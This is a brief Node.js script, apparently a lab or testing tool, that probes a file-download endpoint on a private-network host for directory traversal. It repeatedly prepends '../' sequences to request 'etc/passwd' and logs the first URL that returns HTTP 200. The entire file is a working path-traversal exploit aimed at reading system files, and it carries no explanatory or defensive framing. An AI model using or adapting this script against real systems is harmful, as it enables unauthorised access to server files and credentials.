const http = require('http');

const url = "http://192.168.222.128:3000/download?file=";
const payload = "../";
let success_url = [];

async function test() {

    console.log("-------------------------------------------------------------------------------");

    for (let i = 0; i < 10; i++) {
        try {
            let victim_url = url + payload.repeat(i + 1) + "etc/passwd";
            const response = await new Promise(resolve => {
                http.request(victim_url, resolve).end();
            });
            const status = response.statusCode;

            console.log(status);

            if (status === 200) {
                success_url.push(victim_url);
                console.log(victim_url);
                console.log("-------------------------------------------------------------------------------");
                break;
            }
            console.log(victim_url);
            console.log("-------------------------------------------------------------------------------");
        }   
        catch(error) {
            continue;
        }
        }

}

test();
